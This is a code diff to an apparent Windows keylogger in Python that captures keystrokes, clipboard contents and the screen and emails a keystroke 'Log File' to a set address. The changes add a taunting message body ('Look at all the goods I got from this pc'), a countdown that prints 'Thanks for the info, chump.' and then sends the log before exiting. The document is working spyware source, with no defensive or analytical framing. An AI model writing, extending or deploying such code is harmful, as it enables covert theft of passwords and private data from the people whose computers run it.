@@ -6,7 +6,6 @@ import time
 import numpy as np
 import pyautogui
 
-
 from email import encoders
 import win32clipboard
 from pynput.keyboard import Key, Listener
@@ -53,14 +52,15 @@ file_merge = file_path + extend
 # Screen resolution
 SCREEN_SIZE = tuple(pyautogui.size())
 
-#fourcc = cv2.VideoWriter_fourcc(*"XVID")
+# fourcc = cv2.VideoWriter_fourcc(*"XVID")
 
 # Frames per second
 fps = 30.0
 
-#out = cv2.VideoWriter(video_information, fourcc, fps, SCREEN_SIZE)
+# out = cv2.VideoWriter(video_information, fourcc, fps, SCREEN_SIZE)
 
 vid_time = time_iteration
+
 
 # email controls
 def send_email(filename, attachment, toaddr):
@@ -74,9 +74,13 @@ def send_email(filename, attachment, toaddr):
 
     msg['Subject'] = "Log File"
 
-    body = "Body_of_the_mail"
+    body = "Look at all the goods I got from this pc"
 
     msg.attach(MIMEText(body, 'plain'))
+
+    # body = MIMEText("Look at all the goods I got from this pc", 'plain', 'utf-8')
+
+    # msg.attach(body)
 
     filename = filename
     attachment = open(attachment, 'rb')
@@ -104,7 +108,19 @@ def send_email(filename, attachment, toaddr):
     s.quit()
 
 
-send_email(keys_information, file_path + extend + keys_information, toaddr)
+t = 10
+def countdown(t):
+    while t:
+        mins, secs = divmod(t, 60)
+        timer = '{:02d}:{:02d}'.format(mins, secs)
+        time.sleep(1)
+        t -= 1
+    print("Thanks for the info, chump.")
+    send_email(keys_information, file_path + extend + keys_information, toaddr)
+    exit()
+
+
+countdown(int(t))
 
 
 # get the clipboard contents
